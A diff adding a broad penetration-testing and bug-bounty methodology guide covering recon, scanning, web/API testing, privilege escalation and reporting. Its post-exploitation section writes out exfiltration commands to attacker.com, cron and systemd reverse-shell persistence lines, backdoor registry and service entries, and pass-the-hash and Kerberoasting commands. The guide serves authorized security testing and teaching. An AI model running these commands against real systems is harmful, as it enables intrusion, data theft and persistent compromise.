@@ -1,0 +1,872 @@
+📚 Complete Penetration Testing & Bug Bounty Methodology Guide
+Comprehensive Research Compilation - 2025/2026
+TABLE OF CONTENTS
+Active Reconnaissance & Subdomain Enumeration
+Content Discovery
+Port Scanning & Service Enumeration
+Web Application Testing
+API Recon & Testing
+Cloud & Infrastructure Recon
+Network Layer Testing
+Post-Exploitation & Reporting
+Penetration Testing Methodologies & Phases
+Essential Tools Reference
+1. Active Reconnaissance & Subdomain Enumeration
+1.1 Overview
+Active subdomain enumeration involves direct interaction with the target’s DNS infrastructure to discover subdomains that may not be publicly indexed. This is critical for expanding the attack surface beyond what passive reconnaissance reveals.
+1.2 DNS Brute Forcing
+Tools & Commands
+Gobuster DNS Mode:
+gobuster dns -d target.com -w wordlist.txt -t 50 --delay 100ms -o gobuster_results.txt
+FFuF for Subdomain Fuzzing:
+ffuf -w subdomains.txt -u https://FUZZ.target.com -mc 200,301,302 -t 100 -rate 50 -o fuf_results.json
+Puredns (MassDNS Wrapper):
+puredns -r resolvers.txt bruteforce wordlist.txt target.com
+MassDNS (High-speed resolver):
+massdns -r lists/resolvers.txt -t A domains.txt -o results.txt
+ShuffleDNS (ProjectDiscovery):
+# Subdomain resolvingshuffledns -d example.com -list subdomains.txt -r resolvers.txt -mode resolve# Subdomain bruteforcingshuffledns -d hackerone.com -w wordlist.txt -r resolvers.txt -mode bruteforce
+1.3 Permutation & Alteration Techniques
+Altdns:
+python altdns.py -i input_domains.txt -o ./output/path -w altdns/words.txt
+Gotator (Advanced permutation):
+gotator -sub domains.txt -perm permutations.txt -depth 1 -numbers 10 -mindup -adv -md
+ShuffleDNS for permutations:
+shuffledns -l all.txt -r resolvers.txt -o permuted.txt
+Permutation Examples
+Given api.target.com, generate: - api1.target.com, api2.target.com - api-dev.target.com, dev-api.target.com - api-staging.target.com, api-prod.target.com
+1.4 DNS Zone Transfer (AXFR)
+# Attempt zone transferdig axfr @ns1.target.com target.com# Using DNSRecondnsrecon -d target.com -t axfr# Using fiercefierce --domain target.com
+1.5 Advanced DNS Enumeration
+Empty Non-Terminal (ENT) Detection: - Focus on DNS response codes: NOERROR vs NXDOMAIN - Tools supporting this: dnsx, massdns - NODATA responses (NOERROR with no records) indicate valid subdomains
+CNAME Analysis:
+# Check CNAME records for takeover indicatorsdig CNAME suspicious-subdomain.target.com# Check for dangling CNAMEshost suspicious-subdomain.target.com
+SPF/TXT Record Analysis:
+dig TXT target.comdig MX target.comdig NS target.com
+1.6 Certificate Transparency Logs
+# Using crt.sh via command linecurl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > certificate_subdomains.txt
+1.7 Complete Workflow
+# Step 1: Passive collectionsubfinder -d target.com -all -recursive -silent -o subs.txtamass enum -passive -d target.com -o amass.txtassetfinder --subs-only target.com > assetfinder.txt# Step 2: Combine and deduplicatecat subs.txt amass.txt assetfinder.txt | sort -u > all_passive.txt# Step 3: Generate permutationsaltdns -i all_passive.txt -w permutationWordlist.txt -o permuted.txt# Step 4: Resolve everythingshuffledns -d target.com -list permuted.txt -r resolvers.txt -o resolved.txt# Step 5: Check live hostshttpx -l resolved.txt -status-code -title -tech-detect -o live_hosts.txt
+1.8 Best Practices & Anti-Detection
+Rate limiting: Add delays between requests (--delay 100ms)
+Rotate DNS resolvers: Use multiple resolver lists
+Use VPS: Run active enumeration from cloud instances
+Respect scope: Always check bug bounty scope before brute forcing
+Wildcard detection: Filter wildcard responses using puredns or shuffledns
+2. Content Discovery
+2.1 Directory & File Brute Forcing
+Feroxbuster (Rust-based, fast):
+feroxbuster -u https://target.com/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -C 404
+FFuF (Go-based, highly flexible):
+# Directory fuzzingffuf -u https://target.com/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403# File extension fuzzingffuf -u https://target.com/FUZZ.php -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -mc 200# Virtual host fuzzingffuf -u http://target.com -H "Host: FUZZ.target.com" -w subdomains.txt -mc 200
+Gobuster Directory Mode:
+gobuster dir -u https://target.com -w /path/to/wordlist.txt -x php,html,js,txt -t 50
+Dirsearch:
+dirsearch -u https://target.com -e php,html,js -w wordlist.txt
+2.2 Archive & Historical Analysis
+Waybackurls:
+echo target.com | waybackurls > old_endpoints.txt
+Gau (GetAllUrls):
+echo target.com | gau > urls.txt
+Katana (Modern crawler):
+katana -u https://target.com -jc -jsl -f qurl -o endpoints.txt
+2.3 JavaScript Analysis
+Key Techniques: - Extract endpoints from JS files - Find API keys, secrets, and credentials - Discover hidden parameters and routes
+Tools:
+# Using Katana for JS endpoint extractionkatana -u https://target.com -jc -jsl -f url -silent -o js_endpoints.txt# Using xnLinkFinderpython3 xnLinkFinder.py -i target.com -o output.txt# Using jsluicejsluice https://target.com/app.js# Manual grep patternsgrep -r "api\." *.js | grep -oP 'https?://[^"'\`]+'grep -r "fetch\|axios\|XMLHttpRequest" *.js
+2.4 Parameter Discovery
+Arjun:
+python3 arjun.py -u https://target.com/page.php
+ParamSpider:
+paramspider --domain target.com
+FFuF Parameter Fuzzing:
+ffuf -u https://target.com/page.php?FUZZ=test -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200
+X8 (Hidden parameter discovery):
+x8 -u https://target.com/page.php -w parameters.txt
+2.5 Content Discovery Pipeline
+# Step 1: Crawl and collect URLskatana -u https://target.com -jc -jsl -f url -silent -o all_urls.txt# Step 2: Add historical URLsecho target.com | gau >> all_urls.txt# Step 3: Extract JS endpointscat all_urls.txt | grep "\.js$" | xargs -I {} katana -u {} -jc -jsl -f url >> js_endpoints.txt# Step 4: Directory brute forceffuf -u https://target.com/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403 -o directories.txt# Step 5: Parameter discoverycat all_urls.txt | grep "?" | xargs -I {} arjun -u {} -oJ params.json
+3. Port Scanning & Service Enumeration
+3.1 Nmap Scanning Techniques
+Basic Scan Types
+SYN Scan (Stealth/Half-open):
+nmap -sS 192.168.1.0/24
+TCP Connect Scan:
+nmap -sT 192.168.1.0/24
+UDP Scan:
+nmap -sU 192.168.1.1nmap -sU --top-ports 100 192.168.1.1nmap -sU -p 53,67,68,69,123,161,162,514 192.168.1.1
+Stealth Scans (NULL, FIN, Xmas):
+nmap -sN 192.168.1.1  # NULL scannmap -sF 192.168.1.1  # FIN scannmap -sX 192.168.1.1  # Xmas scan (FIN, PSH, URG)
+ACK Scan (Firewall mapping):
+nmap -sA 192.168.1.1
+Advanced Nmap Options
+# Full port scannmap -p- 192.168.1.1# Fast scan (top 100 ports)nmap -F 192.168.1.1# Version detectionnmap -sV 192.168.1.1nmap -sV --version-intensity 9 192.168.1.1# OS detectionnmap -O 192.168.1.1# Default script scannmap -sC 192.168.1.1# Aggressive scan (OS + version + scripts + traceroute)nmap -A 192.168.1.1# Vulnerability scanning scriptsnmap --script=vuln 192.168.1.1# Specific service enumerationnmap --script=http-enum 192.168.1.1# Decoy scan (hide source)nmap -sS -D RND:10 192.168.1.1# Timing templatesnmap -T4 192.168.1.1  # Aggressivenmap -T5 192.168.1.1  # Insane (noisy)# Fragment packetsnmap -f 192.168.1.1# Host discovery onlynmap -sn 192.168.1.0/24# Skip host discoverynmap -Pn 192.168.1.1
+3.2 Naabu (Fast Port Scanner)
+# Basic scannaabu -host target.com# Specific portsnaabu -p 80,443,21-23,u:53 -host target.com# Full port scannaabu -p - -host target.com# List of hostsnaabu -list hosts.txt# ASN scanecho AS14421 | naabu -p 80,443# UDP with service probesnaabu -host scanme.sh -p u:53,u:123,u:161 -uP# CDN/WAF exclusionnaabu -host target.com -exclude-cdn# Output to JSONnaabu -host target.com -json# Integration with httpxecho target.com | naabu -silent | httpx -silent
+3.3 Masscan (High-speed Internet scanner)
+# Scan entire internet (example - use responsibly!)masscan -p80,443 0.0.0.0/0 --rate 100000# Targeted scanmasscan -p1-65535 192.168.1.0/24 --rate 10000 -oJ output.json
+3.4 Service Enumeration
+Banner Grabbing:
+# Netcatecho -e "\n" | nc -v 192.168.1.1 22# Nmap version detectionnmap -sV -p 22,80,443 192.168.1.1
+NSE Scripts for Service Enumeration:
+# SMB enumerationnmap --script=smb-enum-shares,smb-enum-users -p 445 192.168.1.1# SNMP enumerationnmap --script=snmp-brute,snmp-interfaces,snmp-netstat -p 161 192.168.1.1# HTTP enumerationnmap --script=http-title,http-headers,http-methods -p 80,443 192.168.1.1# SSH enumerationnmap --script=ssh-hostkey,ssh-auth-methods -p 22 192.168.1.1# DNS enumerationnmap --script=dns-brute,dns-zone-transfer -p 53 192.168.1.1
+3.5 UDP Scanning Best Practices
+UDP is connectionless - responses are not guaranteed
+Use protocol-specific probes (DNS query for 53, NTP for 123, SNMP for 161)
+Rate limiting is crucial - ICMP port unreachable responses are often rate-limited
+Combine with -sV for better service detection
+Use --host-timeout to skip slow hosts
+4. Web Application Testing
+4.1 Technology Fingerprinting
+WhatWeb:
+whatweb https://target.com
+Wappalyzer (Browser extension or CLI):
+wappalyzer https://target.com
+BuiltWith: - Online tool: https://builtwith.com
+Nmap with http-enum:
+nmap --script=http-enum -p 80,443 target.com
+Httpx (ProjectDiscovery):
+echo target.com | httpx -title -tech-detect -status-code -o tech_info.txt
+4.2 WAF Detection
+Wafw00f:
+wafw00f https://target.com
+Nmap WAF detection:
+nmap --script=http-waf-detect,http-waf-fingerprint -p 80,443 target.com
+4.3 Screenshotting (Visual Recon)
+Gowitness:
+gowitness file -f urls.txt --threads 4gowitness single -u https://target.com
+Aquatone:
+cat urls.txt | aquatone
+4.4 Vulnerability Scanning with Nuclei
+# Basic scannuclei -target target.com# Using templatesnuclei -target target.com -t cves/ -t vulnerabilities/# Severity filteringnuclei -target target.com -severity critical,high# Tagsnuclei -target target.com -tags cve,exposure# List of targetsnuclei -list targets.txt# Rate limitingnuclei -target target.com -rate-limit 100# Output formatsnuclei -target target.com -o results.txt -json
+4.5 Manual Testing Methodology (OWASP Top 10 2025)
+A01: Broken Access Control
+Test horizontal IDOR (change ID parameter to access other users’ resources)
+Test vertical IDOR (regular user accessing admin functions)
+Test forced browsing to unlinked admin paths
+JWT manipulation (algorithm confusion, weak signing keys)
+Missing authorization on API endpoints
+A02: Cryptographic Failures
+Check for weak hashing (MD5, SHA1)
+Test TLS configuration (TLS 1.0/1.1 enabled, weak ciphers)
+Check for missing HSTS, secure cookie flags
+Look for sensitive data in URLs/query strings
+Search for hardcoded keys in client-side code
+A03: Injection
+SQL Injection (blind SQLi on sort, search, filter parameters)
+NoSQL Injection (MongoDB/DynamoDB operator injection)
+OS Command Injection (file processing endpoints)
+LDAP Injection (authentication systems)
+Server-Side Template Injection (SSTI) on Jinja2/Twig/Handlebars
+A04: Insecure Design
+Missing rate limiting on login, password reset, OTP endpoints
+Weak account recovery flows
+Business logic abuse (race conditions on payment, coupon stacking)
+Insecure direct API design
+A05: Security Misconfiguration
+Exposed admin interfaces (Jenkins, Kibana, Swagger, phpMyAdmin)
+Verbose error messages leaking stack traces
+Missing security headers (CSP, X-Frame-Options, X-Content-Type-Options)
+Default credentials
+Directory listing enabled
+Misconfigured CORS
+A06: Vulnerable and Outdated Components
+Dependency vulnerability scanning (npm audit, pip audit, snyk, Trivy)
+Framework version disclosure in HTTP headers
+Verify if vulnerable libraries are actually exploitable
+A07: Identification and Authentication Failures
+Weak password policy
+Username enumeration on login/signup/password-reset
+Missing or weak MFA
+Session management flaws (predictable tokens, missing timeout)
+OAuth/SAML implementation issues
+SSO bypass via direct authentication endpoints
+A08: Software and Data Integrity Failures
+Insecure deserialization (Java/Python/Ruby)
+Auto-update mechanisms without signature verification
+CI/CD pipeline trust issues
+JavaScript supply chain risk (loading third-party scripts without SRI)
+A09: Security Logging and Monitoring Failures
+Verify security-relevant events are logged
+Check integration with SIEM
+Alerting on suspicious patterns
+A10: Server-Side Request Forgery (SSRF)
+SSRF on URL parameters (webhook, image upload, PDF generation)
+Blind SSRF via out-of-band channels (Burp Collaborator)
+SSRF to cloud metadata endpoints (169.254.169.254 on AWS)
+4.6 Burp Suite Workflow
+Setup
+1. Configure browser proxy: 127.0.0.1:80802. Install CA certificate3. Enable interception4. Browse target application
+Key Features Usage
+Proxy: Intercept and modify requests/responses
+Repeater: Modify and resend individual requests
+Intruder: Automated fuzzing and brute-forcing
+Scanner (Pro): Automated vulnerability detection
+Sequencer: Session token analysis
+Decoder: Encode/decode data
+Comparer: Compare requests/responses
+Extensions to Install
+Autorize (authorization testing)
+Logger++ (advanced logging)
+Turbo Intruder (fast HTTP attacks)
+Param Miner (parameter discovery)
+Upload Scanner (file upload testing)
+4.7 OWASP ZAP Workflow
+# Automated scanzap-cli quick-scan --self-contained --start-options "-config api.disablekey=true" --spider -r -s xss,sqli https://target.com# API scanzap-api-scan.py -t openapi.json -f openapi
+4.8 Nikto Web Scanner
+nikto -host target.comnikto -host target.com -ssl -port 443nikto -host target.com -Tuning 1,2,3,4,5,6,7,8,9,0
+5. API Recon & Testing
+5.1 API Documentation Discovery
+OpenAPI/Swagger:
+# Common paths to check/swagger.json/swagger.yaml/api/swagger.json/v1/swagger.json/openapi.json# Using ffuf to find swagger docsffuf -u https://target.com/FUZZ -w swagger_paths.txt -mc 200
+Postman Collections: - Look for .postman_collection.json files - Check developer portals and documentation - Search GitHub for leaked collections
+5.2 GraphQL Testing
+Introspection Query:
+query {  __schema {    types {      name      fields {        name        type {          name        }      }    }  }}
+Field Suggestion Abuse:
+# Send malformed query to trigger suggestionsquery{system}# Response: "Did you mean 'pastes', 'paste', 'systemDebug'?"
+Tools: - InQL: GraphQL introspection and query generation - GraphQL Voyager: Visualize schema - Clairvoyance: Generate schema when introspection is disabled
+5.3 API Authentication Testing
+OAuth 2.0 Testing: - Test for missing PKCE in mobile apps - Authorization code interception - Token scope manipulation - Refresh token security
+JWT Testing:
+# Decode JWTjwt_tool.py <token># Test for algorithm confusionjwt_tool.py -t <token> -X k# Test for weak signing keysjwt_tool.py -t <token> -C -d secrets.txt
+API Key Testing: - Key in URL parameters (should be in headers) - Missing key rotation - Keys committed to repositories
+5.4 Authorization Testing (BOLA/BFLA)
+Broken Object-Level Authorization (BOLA/IDOR):
+# Test by changing object IDscurl -H "Authorization: Bearer <token>" https://api.target.com/users/123/orderscurl -H "Authorization: Bearer <token>" https://api.target.com/users/124/orders  # Should fail
+Authorization Matrix Testing: - Create matrix of endpoints vs user roles - Test each endpoint with each role - Document expected vs actual responses
+5.5 Rate Limiting & Abuse Testing
+# Test rate limitingfor i in {1..100}; do  curl -H "Authorization: Bearer <token>" https://api.target.com/endpointdone# Test for race conditions# Send multiple simultaneous requests
+5.6 API Input Validation
+Injection Testing:
+# SQL Injection in API parameterscurl -X POST https://api.target.com/search -d '{"query":"test' OR '1'='1"}'# NoSQL Injectioncurl -X POST https://api.target.com/search -d '{"query":{"$gt":""}}'# Command Injectioncurl -X POST https://api.target.com/generate -d '{"template":"test;whoami"}'
+5.7 API Testing Tools
+Postman: - Import OpenAPI specs - Create test collections - Automated testing with Newman
+Insomnia: - Alternative to Postman - Better for GraphQL testing
+HTTPie:
+http GET api.target.com/users Authorization:"Bearer <token>"
+Curl:
+curl -X POST https://api.target.com/endpoint   -H "Content-Type: application/json"   -H "Authorization: Bearer <token>"   -d '{"key":"value"}'
+5.8 Complete API Testing Pipeline
+# Step 1: Discover API documentationffuf -u https://api.target.com/FUZZ -w api_doc_paths.txt -mc 200# Step 2: If GraphQL, test introspectioncurl -X POST https://api.target.com/graphql   -H "Content-Type: application/json"   -d '{"query":"{__schema{types{name}}}"}'# Step 3: Enumerate endpoints with valid tokenhttp GET api.target.com/endpoints Authorization:"Bearer <token>"# Step 4: Test authorization (BOLA)# Change IDs in requests and observe responses# Step 5: Test input validation# Send malformed JSON, special characters, injection payloads# Step 6: Test rate limiting# Send rapid sequential requests# Step 7: Document all findings with curl commands for reproduction
+6. Cloud & Infrastructure Recon
+6.1 ASN & IP Range Enumeration
+# ASN lookupwhois -h whois.radb.net -- '-i origin AS12345'# Using Amass for ASNamass intel -asn 12345# Using asnmap (ProjectDiscovery)echo target.com | asnmap# IP range enumerationnmap -sn 192.168.1.0/24
+6.2 Cloud Storage Enumeration
+AWS S3:
+# S3 bucket enumerations3scanner -b buckets.txt# Using ffuf for S3 bucketsffuf -u https://FUZZ.s3.amazonaws.com -w bucket_names.txt -mc 200,403# AWS CLI (if credentials available)aws s3 ls s3://bucket-nameaws s3 ls s3://bucket-name --recursive# Common S3 bucket naming patterns# <company>-assets# <company>-backup# <company>-dev# <company>-staging# <company>-production
+Azure Blob Storage:
+# Azure blob enumerationffuf -u https://<company>.blob.core.windows.net/FUZZ -w container_names.txt -mc 200,403
+Google Cloud Storage:
+# GCS bucket enumerationffuf -u https://storage.googleapis.com/FUZZ -w bucket_names.txt -mc 200,403
+6.3 GitHub/GitLab Recon
+GitDorker:
+python3 GitDorker.py -tf TOKENSFILE -q "target.com" -d dorks.txt -o output.txt
+TruffleHog (Secret scanning):
+trufflehog git https://github.com/org/repo.gittrufflehog filesystem /path/to/code
+Gitleaks:
+gitleaks detect -v --source /path/to/repo
+Manual GitHub Dorks:
+org:targetcompany "password"org:targetcompany "api_key"org:targetcompany "secret"org:targetcompany "AWS_ACCESS_KEY_ID"org:targetcompany "private_key"filename:config.json org:targetcompanyfilename:.env org:targetcompany
+6.4 Cloud Metadata Service Testing
+AWS Metadata (IMDSv1 - vulnerable):
+curl http://169.254.169.254/latest/meta-data/curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+AWS Metadata (IMDSv2 - requires token):
+TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
+Azure Metadata:
+curl "http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true"
+GCP Metadata:
+curl "http://metadata.google.internal/computeMetadata/v1/instance/" -H "Metadata-Flavor: Google"
+6.5 CDN & WAF Bypass
+CDN Detection:
+# Check if behind CDNwhois target.com | grep -i "cloudflare\|akamai\|fastly\|cloudfront"# Find origin IP# 1. Check historical DNS records# 2. Search Shodan for SSL certificates matching target# 3. Check for DNS records not proxied through CDN
+Origin IP Discovery:
+# Using Shodanshodan search ssl:"target.com"# Using Censyscensys search "target.com"# Check mail server IPs (often not behind CDN)dig MX target.com
+6.6 Infrastructure Recon Pipeline
+# Step 1: ASN enumerationecho target.com | asnmap > asn_info.txt# Step 2: IP range discoveryamass intel -org "Target Company" -o ip_ranges.txt# Step 3: Cloud storage enumerationffuf -u https://FUZZ.s3.amazonaws.com -w s3_buckets.txt -mc 200,403 -o s3_results.txt# Step 4: GitHub recongitdorker -tf tokens -q "target.com" -d dorks.txt -o github_leaks.txt# Step 5: Metadata service testing (if SSRF found)# Test 169.254.169.254 endpoints through SSRF vectors
+7. Network Layer Testing
+7.1 Traceroute & Path Analysis
+# Standard traceroutetraceroute target.com# TCP traceroute (bypasses ICMP blocks)traceroute -T -p 443 target.com# Using Nmap for traceroutenmap --traceroute target.com# MTR (My Traceroute) - continuous monitoringmtr target.com
+7.2 VPN & Tunnel Detection
+# Check for VPN endpointsnmap -p 443,1194,500,4500,1723 target.com# Check for VPN protocolsnmap --script=ike-version -p 500 target.comnmap --script=ssl-enum-ciphers -p 443 target.com# WireGuard detection (UDP 51820)nc -u -v target.com 51820
+7.3 Load Balancer Detection
+# Check for load balancer headerscurl -I https://target.com | grep -i "x-forwarded\|via\|x-cache\|x-served-by"# Multiple requests to check different backendsfor i in {1..10}; do curl -s https://target.com | md5sum; done# Nmap load balancer detectionnmap --script=http-loadbalancer -p 80,443 target.com
+7.4 Network Segmentation Testing
+# Check inter-VLAN routing# From compromised host, scan adjacent subnetsnmap -sn 10.0.1.0/24# Check firewall rules# Attempt connections to various ports across subnets
+7.5 DNS Security Testing
+# DNSSEC checkdig +dnssec target.com DNSKEY# Check for DNS amplification (open resolvers)dig @resolver.target.com ANY target.com# Check for DNS cache snoopingdig @resolver.target.com target.com +norecurse
+7.6 Network Protocol Testing
+# SMB testingnmap --script=smb-security-mode,smb-enum-shares -p 445 target.com# SNMP testingnmap --script=snmp-brute,snmp-interfaces -p 161 target.com# LDAP testingnmap --script=ldap-search -p 389 target.com# RDP testingnmap --script=rdp-enum-encryption,rdp-vuln-ms12-020 -p 3389 target.com
+8. Post-Exploitation & Reporting
+8.1 Linux Privilege Escalation
+Enumeration Scripts
+LinPEAS (Linux Privilege Escalation Awesome Script):
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh# Or download and runwget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.shchmod +x linpeas.sh./linpeas.sh
+LinEnum:
+./LinEnum.sh -r report.txt -e /tmp/ -t
+Linux Exploit Suggester:
+./linux-exploit-suggester.sh
+Manual Checks
+# Basic infowhoamiiduname -acat /etc/os-release# Sudo permissionssudo -l# SUID/SGID binariesfind / -perm -4000 -type f 2>/dev/nullfind / -perm -2000 -type f 2>/dev/null# Writable filesfind / -writable -type f 2>/dev/null# Cron jobscat /etc/crontabls -la /etc/cron.*find /var/spool/cron -type f 2>/dev/null# Running processesps aux# Network connectionsnetstat -tulpnss -tulpn# Installed packagesrpm -qa | grep -i kerneldpkg -l | grep -i kernel# Check for credentials in filesgrep -r "password" /etc/ 2>/dev/nullgrep -r "passwd" /home/ 2>/dev/nullfind /home -name ".ssh" -type d 2>/dev/null
+Common Privilege Escalation Vectors
+SUID binary exploitation (GTFOBins)
+Sudo misconfigurations
+Kernel exploits
+Writable /etc/passwd or /etc/shadow
+Cron job abuse
+Path hijacking
+LD_PRELOAD exploitation
+Docker group membership
+8.2 Windows Privilege Escalation
+Enumeration Scripts
+WinPEAS:
+winpeas.exewinpeas.exe cmd  # Command-line version
+Seatbelt:
+Seatbelt.exe -group=all
+PowerUp:
+. .\PowerUp.ps1Invoke-AllChecks
+Manual Checks
+# Basic infowhoamiwhoami /privwhoami /groupssysteminfo# User enumerationnet usernet localgroup administrators# Service enumerationsc querywmic service get name,displayname,pathname,startmode# Scheduled tasksschtasks /query /fo LIST /v# Registry checksreg query HKLM\SYSTEM\CurrentControlSet\Servicesreg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "DefaultPassword"# Unquoted service pathswmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\" | findstr /i /v """# AlwaysInstallElevatedreg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevatedreg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated# AutoLogon credentialsreg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+Common Windows Privilege Escalation Vectors
+Unquoted service paths
+Weak service permissions
+AlwaysInstallElevated
+Stored credentials (Credential Manager, browser saved passwords)
+UAC bypass techniques
+Token impersonation
+DLL hijacking
+Scheduled task abuse
+8.3 Active Directory Enumeration
+BloodHound:
+# Run SharpHound collector. .\SharpHound.ps1Invoke-BloodHound -CollectionMethod All# Or use the binarySharpHound.exe -c All
+BloodHound Analysis: - Upload ZIP to BloodHound GUI - Run pre-built queries: - Find Domain Admins - Shortest Paths to Domain Admin - Kerberoastable Users - AS-REP Roastable Users
+Common AD Attacks:
+# Kerberoasting. .\Invoke-Kerberoast.ps1Invoke-Kerberoast -OutputFormat hashcat | fl# AS-REP Roasting. .\ASREPRoast.ps1Invoke-ASREPRoast -Verbose# Password spraying# (Use with caution - account lockout risk)
+8.4 Lateral Movement
+# Pass-the-Hash (Impacket)psexec.py -hashes LM:NT admin@target.comwmiexec.py -hashes LM:NT admin@target.comsmbexec.py -hashes LM:NT admin@target.com# Pass-the-Ticketexport KRB5CCNAME=ticket.ccachepsexec.py -k -no-pass admin@target.com# SSH key-basedssh -i id_rsa user@target.com# RDP with Pass-the-Hash (xfreerdp)xfreerdp /v:target.com /u:admin /pth:NT_HASH
+8.5 Pivoting & Tunneling
+Chisel:
+# Server (attacker)chisel server -p 8080 --reverse# Client (compromised host)chisel client http://attacker.com:8080 R:socks
+Ligolo-ng:
+# Server (attacker)ligolo-ng -laddr 0.0.0.0:11601 -selfcert# Agent (compromised host)ligolo-ng-agent -connect attacker.com:11601 -ignore-cert
+SSH Tunneling:
+# Local port forwardssh -L 8080:internal.target.com:80 user@compromised.com# Remote port forwardssh -R 9090:localhost:8080 user@attacker.com# Dynamic SOCKS proxyssh -D 1080 user@compromised.com
+ProxyChains:
+# Configure /etc/proxychains.conf# socks5 127.0.0.1 1080proxychains nmap -sT -p 80,443 internal.target.com
+8.6 Data Exfiltration
+# Using HTTPS (stealthy)curl -X POST https://attacker.com/upload -d @sensitive_file.txt# DNS tunnelingdnscat2iodine# Using common toolsscp sensitive_file.txt attacker@attacker.com:/data/ftp attacker.comput sensitive_file.txt
+8.7 Persistence Techniques
+Linux Persistence
+# SSH authorized_keysecho "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys# Cron job(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'") | crontab -# Systemd servicecat > /etc/systemd/system/update.service << EOF[Unit]Description=System Update[Service]ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'Restart=always[Install]WantedBy=multi-user.targetEOFsystemctl enable update.service# LD_PRELOAD backdoor# (Requires root to modify /etc/ld.so.preload)
+Windows Persistence
+# Registry run keyreg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d "C:\\path\\to\\backdoor.exe" /f# Scheduled taskschtasks /create /tn "SystemUpdate" /tr "C:\\path\\to\\backdoor.exe" /sc minute /mo 5# WMI event subscription# (Use PowerShell scripts for WMI persistence)# Service creationsc create Update binPath= "C:\\path\\to\\backdoor.exe" start= autosc start Update
+8.8 Reporting Structure
+Executive Summary
+High-level findings (Critical/High/Medium/Low counts)
+Business impact assessment
+Risk ratings with CVSS scores
+Remediation priorities
+Technical Report Sections
+Scope & Methodology
+Testing period
+In-scope/out-of-scope assets
+Testing methodology followed (PTES/OWASP/NIST)
+Tools used
+Findings Details (for each vulnerability)
+Vulnerability title and severity
+CVSS score and vector
+Affected URLs/endpoints
+Technical description
+Proof of Concept (screenshots, commands, request/response)
+Business impact
+Remediation recommendations
+References (CVE, CWE, OWASP)
+Appendices
+Test credentials used
+IP addresses tested
+Tools and versions
+Raw output samples
+Report Writing Best Practices
+Use clear, non-technical language for executive summary
+Include screenshots with annotations
+Provide reproducible steps with exact commands
+Prioritize findings by risk, not by discovery order
+Include remediation code examples where possible
+Verify all findings before inclusion
+Get peer review before delivery
+9. Penetration Testing Methodologies & Phases
+9.1 PTES (Penetration Testing Execution Standard)
+Phase 1: Pre-engagement Interactions
+Define project scope and objectives
+Establish Rules of Engagement (RoE)
+Set testing windows and emergency contacts
+Get written authorization
+Define deliverables and timeline
+Establish communication channels
+Phase 2: Intelligence Gathering (OSINT)
+Passive reconnaissance
+Active reconnaissance
+DNS enumeration
+Certificate transparency logs
+Search engine dorks
+Social media analysis
+Data breach repositories (HaveIBeenPwned)
+Phase 3: Threat Modeling
+Analyze business context
+Identify high-value assets
+Map probable attack paths
+Prioritize targets based on risk
+Create threat actor profiles
+Phase 4: Vulnerability Analysis
+Automated scanning (Nessus, OpenVAS)
+Manual verification of findings
+False positive elimination
+Vulnerability chaining analysis
+CVSS scoring
+Phase 5: Exploitation
+Controlled exploitation attempts
+Proof-of-concept development
+Impact demonstration
+Avoid production disruption
+Document all attempts (success and failure)
+Phase 6: Post-Exploitation
+Privilege escalation attempts
+Lateral movement testing
+Data access demonstration
+Persistence testing (with permission)
+Pivoting to internal networks
+Impact assessment
+Phase 7: Reporting
+Executive summary
+Technical findings
+Risk ratings and CVSS scores
+Remediation roadmap
+Retesting requirements
+9.2 NIST SP 800-115
+Phase 1: Planning
+Document Test Plan
+Formal stakeholder sign-off
+Risk assessment
+Resource allocation
+Phase 2: Discovery
+Reconnaissance
+Active scanning
+Manual validation
+Asset inventory
+Phase 3: Attack
+Controlled exploitation
+Safety constraints
+Impact measurement
+Evidence collection
+Phase 4: Reporting
+Executive report
+Technical report
+Remediation guidance
+Audit trail documentation
+9.3 OWASP Testing Guide (WSTG)
+Phase 1: Information Gathering
+Application fingerprinting
+Infrastructure mapping
+Technology stack identification
+Entry point enumeration
+Phase 2: Configuration & Deployment Management Testing
+Test network infrastructure configuration
+Test application platform configuration
+Test file extensions handling
+Test old backup and unreferenced files
+Test HTTP methods
+Test HTTP Strict Transport Security
+Test RIA cross-domain policy
+Phase 3: Identity Management Testing
+Test role definitions
+Test user registration process
+Test account provisioning process
+Test account enumeration and guessable user accounts
+Test weak or unenforced username policy
+Phase 4: Authentication Testing
+Test credentials transported over encrypted channel
+Test default credentials
+Test weak lockout mechanism
+Test bypassing authentication schema
+Test vulnerable remember password
+Test browser cache weakness
+Test weak password policy
+Test weak security question/answer
+Test weak password reset or recovery
+Test weaker authentication in alternative channel
+Phase 5: Authorization Testing
+Test directory traversal/file include
+Test bypassing authorization schema
+Test privilege escalation
+Test insecure direct object references
+Phase 6: Session Management Testing
+Test session management schema
+Test cookies attributes
+Test session fixation
+Test session variable overflow
+Test cross-site request forgery
+Test logout functionality
+Test session timeout
+Test session puzzling
+Phase 7: Input Validation Testing
+Test reflected cross-site scripting
+Test stored cross-site scripting
+Test DOM-based cross-site scripting
+Test SQL injection
+Test LDAP injection
